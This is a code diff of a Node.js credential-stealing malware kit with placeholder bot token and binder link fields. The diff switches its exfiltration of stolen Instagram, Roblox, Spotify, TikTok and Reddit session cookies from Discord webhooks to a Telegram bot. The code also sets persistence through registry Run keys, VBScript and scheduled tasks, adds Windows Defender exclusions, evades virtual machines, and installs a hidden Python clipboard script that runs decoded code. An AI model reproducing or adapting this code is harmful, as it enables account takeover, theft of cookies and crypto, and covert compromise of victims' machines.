@@ -11,9 +11,11 @@ const execPromise = promisify(exec);
 const crypto = require('crypto');
 const sqlite3 = require('sqlite3');
 const util = require('util');
+
 function getLocale() {
     return Intl.DateTimeFormat().resolvedOptions().locale.slice(0, 2).toUpperCase();
 }
+
 const computerName = os.hostname();
 const local = process.env.LOCALAPPDATA;
 const discords = [];
@@ -21,8 +23,8 @@ const locale = getLocale();
 const mainFolderPath = `C:/ProgramData/Steam/Launcher/${generateRandomString(12)}/${locale}-${computerName}`;
 var appdata = process.env.APPDATA, LOCAL = process.env.LOCALAPPDATA, localappdata = process.env.LOCALAPPDATA;
 const keywords = ["gmail.com", "live.com", "impots.gouv.fr", "zoho.com", "ameli.fr", "yahoo.com", "tutanota.com", "uber.com", "trashmail.com", "gmx.net", "github.com", "ubereats.com", "safe-mail.net", "thunderbird.net", "mail.lycos.com", "hushmail.com", "mail.aol.com", "icloud.com", "protonmail.com", "fastmail.com", "rackspace.com", "1and1.com", "mailbox.org", "mail.yandex.com", "titan.email", "youtube.com", "nulled.to", "cracked.to", "tiktok.com", "yahoo.com", "gmx.com", "aol.com", "coinbase", "mail.ru", "rambler.ru", "gamesense.pub", "neverlose.cc", "onetap.com", "fatality.win", "vape.gg", "binance", "ogu.gg", "lolz.guru", "xss.is", "g2g.com", "igvault.com", "plati.ru", "minecraft.net", "primordial.dev", "vacban.wtf", "instagram.com", "mail.ee", "hotmail.com", "facebook.com", "vk.ru", "x.synapse.to", "hu2.app", "shoppy.gg", "app.sell", "sellix.io", "gmx.de", "riotgames.com", "mega.nz", "roblox.com", "exploit.in", "breached.to", "v3rmillion.net", "hackforums.net", "0x00sec.org", "unknowncheats.me", "godaddy.com", "accounts.google.com", "aternos.org", "namecheap.com", "hostinger.com", "bluehost.com", "hostgator.com", "siteground.com", "netafraz.com", "iranserver.com", "ionos.com", "whois.com", "te.eg", "vultr.com", "mizbanfa.net", "neti.ee", "osta.ee", "cafe24.com", "wpengine.com", "parspack.com", "cloudways.com", "inmotionhosting.com", "hinet.net", "mihanwebhost.com", "mojang.com", "phoenixnap.com", "dreamhost.com", "rackspace.com", "name.com", "alibabacloud.com", "a2hosting.com", "contabo.com", "xinnet.com", "7ho.st", "hetzner.com", "domain.com", "west.cn", "iranhost.com", "yisu.com", "ovhcloud.com", "000webhost.com", "reg.ru", "lws.fr", "home.pl", "sakura.ne.jp", "matbao.net", "scalacube.com", "telia.ee", "estoxy.com", "zone.ee", "veebimajutus.ee", "beehosting.pro", "core.eu", "wavecom.ee", "iphoster.net", "cspacehostings.com", "zap-hosting.com", "iceline.com", "zaphosting.com", "cubes.com", "chimpanzeehost.com", "fatalityservers.com", "craftandsurvive.com", "mcprohosting.com", "shockbyte.com", "ggservers.com", "scalacube.com", "apexminecrafthosting.com", "nodecraft.com", "sparkedhost.com", "pebblehost.com", "ramshard.com", "linkvertise.com", "adf.ly", "spotify.com", "tv3play.ee", "clarity.tk", "messenger.com", "snapchat.com", "boltfood.eu", "stuudium.com", "steamcommunity.com", "epicgames.com", "greysec.net", "twitter.com", "reddit.com", "amazon.com", "redengine.eu", "eulencheats.com", "4netplayers.com", "velia.net", "bybit.com", "coinbase.com", "ftx.com", "ftx.us", "binance.us", "bitfinex.com", "kraken.com", "bitstamp.net", "bittrex.com", "kucoin.com", "cex.io", "gemini.com", "blockfi.com", "nexo.io", "nordvpn.com", "surfshark.com", "privateinternetaccess.com", "netflix.com", "astolfo.lgbt", "intent.store", "novoline.wtf", "flux.today", "moonx.gg", "novoline.lol", "twitch.tv"];
-const atomicInjectionUrl = "https://github.com/";
-const exodusInjectionUrl = "https://github.com/";
+const atomicInjectionUrl = "";
+const exodusInjectionUrl = "";
 
 const url = 'BINDER-LINK-HERE';
 const botToken = 'YOURBOTTOKEN';
@@ -213,7 +215,6 @@ function antivm() {
             }
         }
 
-        // Start the check chain
         usernameCheck(() => {
             console.log("All checks passed successfully.");
         });
@@ -252,10 +253,8 @@ function hideconsole() {
     fs.writeFileSync(tempfile, powershellScript);
 
     try {
-        // Execute the PowerShell script
         execSync(`powershell.exe -ExecutionPolicy Bypass -File "${tempfile}"`, { stdio: 'inherit' });
     } finally {
-        // Clean up temporary file
         fs.unlinkSync(tempfile);
     }
 }
@@ -337,84 +336,17 @@ function onlyUnique(item, index, array) {
     return array.indexOf(item) === index;
 }
 
-/*
-const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
-const keyName = 'Steam';
-
-function removeRegistryKey() {
-    const command = `reg delete "${registryPath}" /v ${keyName} /f`;
-
-    exec(command, (error, stdout, stderr) => {
-        if (error) {
-            const errorMessage = `Error while deleting registry key: ${error.message}`;
-            console.error(errorMessage);
-            return;
-        }
-
-        if (stderr) {
-            const errorMessage = `CMD Error: ${stderr}`;
-            console.error(errorMessage);
-            return;
-        }
-
-        // Check if the key was successfully deleted
-        if (stdout.includes('The system was unable to find the specified registry key or value.')) {
-            console.log(`Registry key "${keyName}" did not exist.`);
-        } else {
-            console.log(`Registry key "${keyName}" successfully deleted.`);
-            // Fully disable Steam Client Service
-            exec('sc config "Steam Client Service" start=disabled', (error, stdout, stderr) => {
-                if (error) {
-                    console.error(`Error while disabling service: ${error.message}`);
-                    return;
-                }
-
-                if (stderr) {
-                    console.error(`CMD Error: ${stderr}`);
-                    return;
-                }
-
-                console.log(`Steam Client Service disabled: ${stdout}`);
-
-                // Delete Steam Client Service
-                exec('sc delete "Steam Client Service"', (error, stdout, stderr) => {
-                    if (error) {
-                        console.error(`Error while deleting service: ${error.message}`);
-                        return;
-                    }
-
-                    if (stderr) {
-                        console.error(`CMD Error: ${stderr}`);
-                        return;
-                    }
-
-                    console.log(`Steam Client Service deleted: ${stdout}`);
-                });
-            });
-        }
-    });
-}
-*/
 
 function startup() {
-  // Path to the current .exe file
-  const exeFilePath = process.execPath; // Get the path of the running executable
-
-  // VBScript file name and path
+  const exeFilePath = process.execPath;
   const vbsFileName = 'Update.vbs';
-  const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName); // Full path to the VBScript file in ProgramData
-
-  // Registry key path
+  const programDataPath = path.join(process.env.PROGRAMDATA, vbsFileName);
   const registryPath = 'HKCU\\SOFTWARE\\Microsoft\\Windows\\CurrentVersion\\Run';
-  const keyName = path.basename(exeFilePath, '.exe'); // Use the name of the .exe file without extension
-
-  // Create VBScript content to run the .exe minimized
+  const keyName = path.basename(exeFilePath, '.exe');
   const vbsContent = `Set WshShell = CreateObject("WScript.Shell")\nWshShell.Run """${exeFilePath}""", 7\n`;
 
-  // Write the VBScript to ProgramData
   fs.writeFileSync(programDataPath, vbsContent);
 
-  // Command to add the VBScript file to the registry
   const addCommand = `reg add "${registryPath}" /v ${keyName} /t REG_SZ /d "${programDataPath}" /f`;
 
   exec(addCommand, (error, stdout, stderr) => {
@@ -804,9 +736,8 @@ function downloadPythonInstaller(url, outputFilePath) {
     });
 }
 
-// Function to install Python
 async function installPython() {
-    const tempDir = os.tmpdir();  // Use the temporary directory
+    const tempDir = os.tmpdir();
     const pythonInstallerUrl = 'https://www.python.org/ftp/python/3.12.6/python-3.12.6-amd64.exe';
     const pythonInstallerFile = path.join(tempDir, 'python-installer.exe');
 
@@ -829,7 +760,6 @@ async function installPython() {
     }
 
 
-    // Delete the installer file
     fs.unlinkSync(pythonInstallerFile);
     console.log('Installer deleted.');
 
@@ -845,7 +775,6 @@ function addDefenderExclusions() {
         `powershell -Command Add-MpPreference -ExclusionPath "${systemTasksPath}"`
     ];
 
-    // Execute each PowerShell command synchronously
     commands.forEach((command) => {
         try {
             const output = execSync(command, { stdio: 'pipe' }).toString();
@@ -874,7 +803,7 @@ async function clip(pythonwExe) {
     const appDataHiddenFolder = path.join(os.homedir(), 'AppData', 'Local', `.${generateRandomString(10)}`);
     if (!fs.existsSync(appDataHiddenFolder)) {
         fs.mkdirSync(appDataHiddenFolder, { recursive: true });
-        fs.chmodSync(appDataHiddenFolder, 0o700); // Make it hidden
+        fs.chmodSync(appDataHiddenFolder, 0o700);
     }
 
     const scriptContent = `
@@ -908,12 +837,10 @@ exec(decoded_code)
     await execPromise('pip install pyperclip');
     
     try {
-        // Add the script to the registry for startup
         const registryCommand = `reg add "HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run" /v "PythonScript" /t REG_SZ /d "${pythonwExe} \\"${scriptFilePath}\\"" /f`;
         execSync(registryCommand);
         console.log('Python script added to registry for startup.');
 
-        // Also schedule the task
         const taskName = `PythonUpdater_${generateRandomString(8)}`;
         execSync(`schtasks /create /tn "${taskName}" /tr "\"${pythonwExe}\" \"${scriptFilePath}\"" /sc onlogon /f`);
         console.log('Python script scheduled to run at logon.');
@@ -921,115 +848,28 @@ exec(decoded_code)
         console.error(`Error scheduling task or adding registry entry: ${error.message}`);
     }
     
-    // Run the Python script in the background
     try {
         const pythonProcess = spawn(pythonwExe, [scriptFilePath], { detached: true, stdio: 'ignore' });
-        pythonProcess.unref();  // Detach the process to let it run in the background
+        pythonProcess.unref();
         console.log('Python script executed successfully in the background.');
     } catch (error) {
         console.error(`Error running Python script: ${error.message}`);
     }
 }
 
-// Main function to create and execute scripts and add Defender exclusions
 async function createAndExecuteScripts() {
     try {
-        addDefenderExclusions(); // Add hidden folder to Defender exclusions
-        const pythonwExe = await installPython(); // Assume installPython is your function to install Python
-        await clip(pythonwExe);  // Run the Python script
+        addDefenderExclusions();
+        const pythonwExe = await installPython(); 
+        await clip(pythonwExe);
     } catch (error) {
         console.error(`Error: ${error.message}`);
     }
 
-    // Continue script execution even after an error
     console.log('Continuing script execution...');
 }
 
-/* old shit
-function createRunBat() {
-    const userData = path.join('C:', 'ProgramData', 'edge', 'Updater');
-    if (!fs.existsSync(userData)) {
-        fs.mkdirSync(userData, { recursive: true });
-    }
 
-    // URL
-    const downloadUrl1 = "YOUR-STEALER-EXE-LINK-HERE";
-    const downloadUrl2 = "YOUR-BINDED-EXE-LINK-HERE";
-    
-    const app1Path = `"${process.argv[0]}"`;
-    const app2Path = '"%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup\\Steam_Service.exe"';
-
-    const batFileName = `${generateRandomString(10)}.bat`;
-    const vbsFileName = `${generateRandomString(10)}.vbs`;
-    const batScriptPath = path.join(userData, batFileName);
-    const vbsScriptPath = path.join(userData, vbsFileName);
-
-    const batContent = `@echo off
-
-powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows\\Start Menu\\Programs\\Startup"
-powershell Add-MpPreference -ExclusionPath "%APPDATA%\\Microsoft\\Windows"
-REM Add registry key
-reg add HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Steam" /t REG_SZ /d ${app1Path} /f
-
-REM Display registry value
-reg query HKCU\\Software\\Microsoft\\Windows\\CurrentVersion\\Run /v "Steam"
-
-REM Verify if App1 is already installed
-if not exist ${app1Path} (
-    REM Download and install App1
-    curl -o ${app1Path} ${downloadUrl1}
-    if not exist ${app1Path} (
-        echo Error downloading App1.
-    ) else (
-        echo App1 installed successfully.
-    )
-) else (
-    echo App1 is already installed.
-)
-REM Verify if App2 is already installed
-if not exist ${app2Path} (
-    REM Download and install App2
-    curl -o ${app2Path} ${downloadUrl2}
-    if not exist ${app2Path} (
-        echo Error downloading App2.
-    ) else (
-        echo App2 installed successfully.
-    )
-) else (
-    echo App2 is already installed.
-)
-`;
-
-    fs.writeFileSync(batScriptPath, batContent, 'utf-8');
-    console.log(`Batch script created successfully at: ${batScriptPath}`);
-
-    const vbsContent = `Set objShell = CreateObject("WScript.Shell")
-objShell.Run "${batScriptPath}", 0, True
-Set objShell = Nothing`;
-
-    fs.writeFileSync(vbsScriptPath, vbsContent, 'utf-8');
-    console.log(`VBS script created successfully at: ${vbsScriptPath}`);
-
-    const taskName = 'GoogleUpdateTaskMachineUAC';
-    const schtasksCommand = `schtasks /create /tn "${taskName}" /tr "cscript //nologo ${vbsScriptPath}" /sc minute /mo 10 /f /RU SYSTEM`;
-
-    exec(schtasksCommand, (err, stdout, stderr) => {
-        if (err) {
-            console.error('Error executing schtasks command:', err.message);
-        } else {
-            console.log('Scheduled task for verification created successfully.');
-            const runVbsCommand = `cscript //nologo "${vbsScriptPath}"`;
-            exec(runVbsCommand, (vbsErr, vbsStdout, vbsStderr) => {
-                if (vbsErr) {
-                    console.error('Error executing VBS script:', vbsErr.message);
-                } else {
-                    console.log('VBS script executed successfully.');
-                }
-            });
-        }
-    });
-}
-*/
 
 
 async function GetInstaData(session_id) {
@@ -1046,11 +886,9 @@ async function GetInstaData(session_id) {
       "Cookie": `sessionid=${session_id};`
     };
 
-    // Request to get Instagram account data
     const response = await axios.get("https://i.instagram.com/api/v1/accounts/current_user/?edit=true", { headers: headers });
     const userData = response.data.user;
 
-    // Create data object
     const data = {
       username: userData.username,
       verified: userData.is_verified,
@@ -1058,7 +896,6 @@ async function GetInstaData(session_id) {
       session_id: session_id
     };
 
-    // Save Instagram session information to a file
     saveInstagramFile(session_id);
 
     return data;
@@ -1075,7 +912,6 @@ function saveInstagramFile(session_id) {
     fs.mkdirSync(instagramFolderPath);
   }
 
-  // Write the Instagram session information to the instagram.txt file
   fs.writeFileSync(instagramFilePath, `sessionid=${session_id}`);
 
   console.log('Instagram session information written to instagram.txt');
@@ -1103,51 +939,45 @@ async function GetFollowersCount(session_id) {
 }
 
 async function SubmitInstagram(session_id) {
-  try {
-    const data = await GetInstaData(session_id);
-    const followersCount = await GetFollowersCount(session_id);
-
-    const embed = {
-      title: '‎ ',
-      color: 0x303037,
-      author: {
-        name: 'Instagram Session Detected',
-        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190791450938572800/2048px-Instagram_icon.png'
-      },
-      thumbnail: { url: data.avatar },
-      fields: [
-        { name: '<a:VerifiedUser:1205132509076135987> Verified Account', value: '```' + (data.verified ? 'Yes' : 'No') + '```', inline: true },
-        { name: '👤 Username ', value: '```' + data.username + '```', inline: true },
-        { name: '<:twitter_follow:1205132510254604388> Followers Count ', value: '```' + followersCount + '```', inline: true },
-        { name: 'Token', value: '```' + data.session_id + '```', inline: false },
-      ],
-      footer: {
-        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-      },
-    };
-
-
-
-    let retryAttempts = 0;
-    while (retryAttempts < 3) {
-      try {
-        await axios.post(discordWebhookUrl, { embeds: [embed] });
-        break;
-      } catch (error) {
-        if (error.response && error.response.status === 429) {
-          const delay = Math.pow(2, retryAttempts) * 1000;
-          retryAttempts++;
-          await new Promise(resolve => setTimeout(resolve, delay));
-        } else {
-          console.error("Error in second webhook request:", error.message);
-          return;
+    try {
+      const data = await GetInstaData(session_id);
+      const followersCount = await GetFollowersCount(session_id);
+  
+      const message = `
+📷${user.hostname} - Instagram Session
+👤 Username: ${data.username}
+✅ Verified Account: ${data.verified ? 'Yes' : 'No'}
+📈 Followers Count: ${followersCount}
+🔑 Session ID: ${data.session_id}
+`;
+  
+      const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  
+      let retryAttempts = 0;
+      while (retryAttempts < 3) {
+        try {
+          await axios.post(telegramUrl, {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+          });
+          break;
+        } catch (error) {
+          if (error.response && error.response.status === 429) {
+            const delay = Math.pow(2, retryAttempts) * 1000;
+            retryAttempts++;
+            await new Promise(resolve => setTimeout(resolve, delay));
+          } else {
+            console.error("Error in Instagram Telegram message request:", error.message);
+            return;
+          }
         }
       }
+    } catch (error) {
+      console.error("Error Submit Instagram:", error.message);
     }
-  } catch (error) {
-    console.error("Error Submit Instagram:", error.message);
-  }
 }
+
 
 
 async function GetRobloxData(secret_cookie) {
@@ -1193,60 +1023,45 @@ async function SubmitRoblox(secret_cookie) {
 
     const robuxValue = data.robux === 0 ? 'No Robux' : data.robux;
 
-    let embed = {
-      title: '‎',
-      color: 0x303037,
-      author: {
-        name: 'Roblox Session Detected',
-        icon_url: 'https://images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%3Fsize%3D96%26quality%3Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-      },
-      thumbnail: {
-        url: data.avatar,
-      },
-      fields: [
-        {
-          name: 'Name:',
-          value: '```     ' + data.username + '     ```',
-          inline: true,
-        },
-        {
-          name: 'Robux:',
-          value: '```   ' + robuxValue + '   ```',
-          inline: true,
-        },
-        {
-          name: 'Premium:',
-          value: '```   ' + (data.premium ? 'Yes' : 'No') + '   ```',
-          inline: true,
-        },
-        {
-          name: 'Secret Cookie:',
-          value: '```   ' + secret_cookie + '   ```',
-          inline: true,
-        },
-      ],
-      footer: {
-        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-      },
-    };
+    const message = `
+${user.hostname} - Roblox Session
+Name: ${data.username}
+Robux: ${robuxValue}
+Premium: ${data.premium ? 'Yes' : 'No'}
+Cookie: ${secret_cookie}
+`;
+  
 
-    let payload = {
-      embeds: [embed],
-    };
-
-    await new Promise(resolve => setTimeout(resolve, 1000));
-
-    console.log('Payload to be sent:', payload);
-
-    axios.post(discordWebhookUrl, payload);
-  } catch (error) {
-    console.error('Error in SubmitRoblox:', error.message);
-  }
+    const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  
+    let retryAttempts = 0;
+    while (retryAttempts < 3) {
+    try {
+        await axios.post(telegramUrl, {
+            chat_id: chatId,
+            text: message,
+            parse_mode: 'HTML'
+        });
+        break;
+    } catch (error) {
+        if (error.response && error.response.status === 429) {
+            const delay = Math.pow(2, retryAttempts) * 1000;
+            retryAttempts++;
+            await new Promise(resolve => setTimeout(resolve, delay));
+        }   else {
+            console.error("Error in Roblox Telegram message request:", error.message);
+            return;
+            }
+        }
+    }
+    } catch (error) {
+    console.error("Error Submit Roblox:", error.message);
+    }
 }
 
 
-//
+
+
 async function SpotifySession(cookie) {
     try {
         const url = 'https://www.spotify.com/api/account-settings/v1/profile';
@@ -1266,54 +1081,47 @@ async function SpotifySession(cookie) {
         const country = profileData.country || "Not available";
         const username = profileData.username || "Not available";
 
-        const embedData = {
-            title: '',
-            color: 0x303037,
-            author: {
-                name: 'Spotify Session Detected',
-                icon_url: 'https://upload.wikimedia.org/wikipedia/commons/thumb/7/74/Spotify_App_Logo.svg/1200px-Spotify_App_Logo.svg.png'
-            },
-            fields: [
-                { name: 'Email', value: "```" + email + "```", inline: true },
-                { name: 'Username', value: "```" + username + "```", inline: true },
-                { name: 'Gender', value: "```" + gender + "```", inline: true },
-                { name: 'Birthdate', value: "```" + birthdate + "```", inline: true },
-                { name: 'Country', value: "```" + country + "```", inline: true },
-                { name: 'Spotify Profile', value: `[Open Profile](https://open.spotify.com/user/${username})`, inline: false },
-                { name: 'Spotify Cookie | sp_dc=', value: '```' + cookie + '```', inline: false }
-            ],
-            footer: {
-                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
+        const message = `
+${user.hostname} - Spotify Session
+Email: ${email}
+Username: ${username}
+Gender: ${gender}
+Birthdate: ${birthdate}
+Country: ${country}
+Profile URL: [Open Profile](https://open.spotify.com/user/${username})
+Cookie: ${cookie}
+`;          
+
+        const telegramUrl = `https://api.telegram.org/bot${botToken}/sendMessage`;
+  
+        let retryAttempts = 0;
+        while (retryAttempts < 3) {
+          try {
+            await axios.post(telegramUrl, {
+              chat_id: chatId,
+              text: message,
+              parse_mode: 'HTML'
+            });
+            break;
+          } catch (error) {
+            if (error.response && error.response.status === 429) {
+              const delay = Math.pow(2, retryAttempts) * 1000;
+              retryAttempts++;
+              await new Promise(resolve => setTimeout(resolve, delay));
+            } else {
+              console.error("Error in Spotify Telegram message request:", error.message);
+              return;
             }
-        };
-
-        const payload = {
-            embeds: [embedData],
-        };
-
-        const randomString = crypto.randomBytes(3).toString('hex');
-
-        setTimeout(() => {
-            axios.post(discordWebhookUrl, payload)
-                .then(response => {
-                    console.log('Webhook sent successfully spotify:', response.data);
-                })
-                .catch(error => {
-                    console.error('Error sending Discord webhook:', error.message);
-                    console.error('Error Message:', error.message);
-                });
-        }, 5000);
+          }
+        }
     } catch (error) {
-        console.error('Error fetching Spotify data:', error.message);
-        console.error('Error Message:', error.message);
+        console.error("Error Submit Spotify:", error.message);
     }
 }
 
 
 function moveTikTokFile(cookie) {
   if (!cookie) {
-    // No TikTok session information intercepted, so no need to create the folder or file
     return;
   }
   const tiktokFolderPath = path.join(mainFolderPath, 'Tiktok');
@@ -1321,212 +1129,162 @@ function moveTikTokFile(cookie) {
   if (!fs.existsSync(tiktokFolderPath)) {
     fs.mkdirSync(tiktokFolderPath);
   }
-  // Write the intercepted TikTok session information to the tiktok.txt file
   fs.writeFileSync(tiktokFilePath, cookie);
   console.log('TikTok session information written to tiktok.txt');
 }
 
 
-function stealTikTokSession(cookie) {
-  try {
-    const headers = {
-      'accept': 'application/json, text/plain, */*',
-      'accept-encoding': 'gzip, compress, deflate, br',
-      'cookie': `sessionid=${cookie}`
-    };
-
-    axios.get("https://www.tiktok.com/passport/web/account/info/?aid=1459&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true&device_platform=web_pc&focus_state=true&from_page=fyp&history_len=2&is_fullscreen=false&is_page_visible=true&os=windows&priority_region=DE&referer=&region=DE&screen_height=1080&screen_width=1920&tz_name=Europe%2FBerlin&webcast_language=de-DE", { headers })
-      .then(response => {
-        const accountInfo = response.data;
-
-        if (!accountInfo || !accountInfo.data || !accountInfo.data.username) {
-          throw new Error("Failed to retrieve TikTok account information.");
-        }
-
-        axios.post(
-          "https://api.tiktok.com/aweme/v1/data/insighs/?tz_offset=7200&aid=1233&carrier_region=DE",
-          "type_requests=[{\"insigh_type\":\"vv_history\",\"days\":16},{\"insigh_type\":\"pv_history\",\"days\":16},{\"insigh_type\":\"like_history\",\"days\":16},{\"insigh_type\":\"comment_history\",\"days\":16},{\"insigh_type\":\"share_history\",\"days\":16},{\"insigh_type\":\"user_info\"},{\"insigh_type\":\"follower_num_history\",\"days\":17},{\"insigh_type\":\"follower_num\"},{\"insigh_type\":\"week_new_videos\",\"days\":7},{\"insigh_type\":\"week_incr_video_num\"},{\"insigh_type\":\"self_rooms\",\"days\":28},{\"insigh_type\":\"user_live_cnt_history\",\"days\":58},{\"insigh_type\":\"room_info\"}]",
-          { headers: { cookie: `sessionid=${cookie}` } }
-        )
-          .then(response => {
-            const insights = response.data;
-
-            axios.get(
-              "https://webcast.tiktok.com/webcast/wallet_api/diamond_buy/permission/?aid=1988&app_language=de-DE&app_name=tiktok_web&battery_info=1&browser_language=de-DE&browser_name=Mozilla&browser_online=true&browser_platform=Win32&browser_version=5.0%20%28Windows%20NT%2010.0%3B%20Win64%3B%20x64%29%20AppleWebKit%2F537.36%20%28KHTML%2C%20like%20Gecko%29%20Chrome%2F112.0.0.0%20Safari%2F537.36&channel=tiktok_web&cookie_enabled=true",
-              { headers: { cookie: `sessionid=${cookie}` } }
-            )
-              .then(response => {
-                const wallet = response.data;
-
-                const webhookPayload = {
-                  embeds: [
-                    {
-                      title: '‎ ',
-                      color: 0x303037,
-                      author: {
-                        name: 'Tiktok Session Detected',
-                        icon_url: 'https://cdn.discordapp.com/attachments/660885288079589385/1190790151086035094/tiktok-6338430_1280.png' 
-                      },
-                      fields: [
-                        {
-                          name: '<:cookie:1205123589930749995> Cookies',
-                          value: "```" + cookie + "```",
-                          inline: true
-                        },
-                        {
-                          name: "Profile URL",
-                          value: accountInfo.data.username ? `[Click here](https://tiktok.com/@${accountInfo.data.username})` : "Username not available",
-                          inline: true
-                        },
-                        {
-                          name: "User Identifier",
-                          value: "```" + (accountInfo.data.user_id_str || "Not available") + "```",
-                          inline: true
-                        },
-                        {
-                          name: ":envelope: Email",
-                          value: "```" + (accountInfo.data.email || "No Email") + "```",
-                          inline: true
-                        },
-                        {
-                          name: "👤 Username",
-                          value: "```" + accountInfo.data.username + "```",
-                          inline: true
-                        },
-                        {
-                          name: "<:twitter_follow:1205132510254604388> Follower Count",
-                          value: "```" + (insights?.follower_num?.value || "Not available") + "```",
-                          inline: true
-                        },
-                        {
-                          name: "<:freetiktokcoinwithblinkstar74553:1205133412122230915> Coins",
-                          value: "```" + wallet.data.coins + "```",
-                          inline: true
-                        }
-                      ],
-                      footer: {
-                        text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                        icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp',
-                      },
-                    }
-                  ]
-                };
-
-                axios.post(discordWebhookUrl, webhookPayload)
-                  .then(response => {
-                    console.log('Discord webhook sent successfully! send tiktok');
-                    moveTikTokFile(cookie);
-                  })
-                  .catch(error => {
-                    console.error('Error sending Discord webhook:', error.message);
-                  });
-              })
-              .catch(error => {
-                console.error('An error occurred while trying to retrieve wallet information:', error.message);
-              });
-          })
-          .catch(error => {
-            console.error('An error occurred while trying to retrieve insights:', error.message);
-          });
-      })
-      .catch(error => {
-        console.error('An error occurred while trying to retrieve account information:', error.message);
-      });
-  } catch (error) {
-    console.error('An error occurred while trying to steal TikTok session:', error.message);
-  }
-}
-
-
-function setRedditSession(cookie) {
+async function stealTikTokSession(cookie) {
     try {
-        const cookies = `reddit_session=${cookie}`;
-        const headers = {
-            'Cookie': cookies,
-            'Authorization': 'Basic b2hYcG9xclpZdWIxa2c6'
-        };
-
-        const jsonData = {
-            scopes: ['*', 'email', 'pii']
-        };
-
-        const tokenUrl = 'https://accounts.reddit.com/api/access_token';
-        const userDataUrl = 'https://oauth.reddit.com/api/v1/me';
-
-        axios.post(tokenUrl, jsonData, { headers })
-            .then(tokenResponse => {
-                const accessToken = tokenResponse.data.access_token;
-                const userHeaders = {
-                    'User-Agent': 'android:com.example.myredditapp:v1.2.3',
-                    'Authorization': `Bearer ${accessToken}`
-                };
-
-                axios.get(userDataUrl, { headers: userHeaders })
-                    .then(userDataResponse => {
-                        const userData = userDataResponse.data;
-                        const username = userData.name;
-                        const profileUrl = `https://www.reddit.com/user/${username}`;
-                        const commentKarma = userData.comment_karma;
-                        const totalKarma = userData.total_karma;
-                        const coins = userData.coins;
-                        const mod = userData.is_mod;
-                        const gold = userData.is_gold;
-                        const suspended = userData.is_suspended;
-
-                        const embedData = {
-                            title: "",
-                            description: "",
-                            color: 0x303037, 
-                            url: '',
-                            timestamp: new Date().toISOString(),
-                            fields: [
-                { name: '<:cookie:1205123589930749995> Cookies', value: '```' + cookies + '```', inline: false },
-                { name: '🌐 Profile URL', value: '```' + profileUrl + '```', inline: false },
-                { name: '👤 Username', value: '```' + username + '```', inline: false },
-                { name: '', value: '💬 Comments: ```' + commentKarma + '``` 👍 Total Karma: ```' + totalKarma + '```', inline: true },
-                { name: '💰 Coins', value: '```' + coins + '```', inline: false },
-                { name: '🛡️ Moderator', value: '```' + (mod ? 'Yes' : 'No') + '```', inline: true },
-                { name: '🌟 Reddit Gold', value: '```' + (gold ? 'Yes' : 'No') + '```', inline: true },
-                { name: '🚫 Suspended', value: '```' + (suspended ? 'Yes' : 'No') + '```', inline: true }
-                            ],
-                            footer: {
-                                text: `${user.hostname} | @WallGod69 | discord.gg/doenerium`,
-                                icon_url: 'https://images-ext-1.discordapp.net/external/j13wOpj4IOzsnGWzfZFrNsUn7KgMCVWH0OBylRYcIWg/https/images-ext-1.discordapp.net/external/XF_zctmsx1ZUspqbqhZfSm91qIlNvdtEVMkl7uISZD8/%253Fsize%253D96%2526quality%253Dlossless/https/cdn.discordapp.com/emojis/948405394433253416.webp'
-                            },
-                            author: {
-                                name: "Reddit Session Detected",
-                                icon_url: "https://preview.redd.it/reddit-logo-changes-to-old-non-pixelated-logo-sign-of-v0-1povzsj8o0eb1.jpg?width=640&crop=smart&auto=webp&s=8bab770af358cf676163dbde410c9caa2b13cbe5"
-                            }
-                        };
-
-                        axios.post(discordWebhookUrl, { embeds: [embedData] })
-                            .catch(error => {
-                                console.error('Error sending Discord webhook:', error.message);
-                            });
-                    })
-                    .catch(error => {
-                        axios.post(discordWebhookUrl, { content: 'Error retrieving user data: ' + error.message })
-                            .catch(webhookError => {
-                                console.error('Error sending Discord webhook:', webhookError.message);
-                            });
-                    });
-            })
-            .catch(error => {
-                axios.post(discordWebhookUrl, { content: 'Error obtaining access token: ' + error.message })
-                    .catch(webhookError => {
-                        console.error('Error sending Discord webhook:', webhookError.message);
-                    });
-            });
+      const headers = {
+        'accept': 'application/json, text/plain, */*',
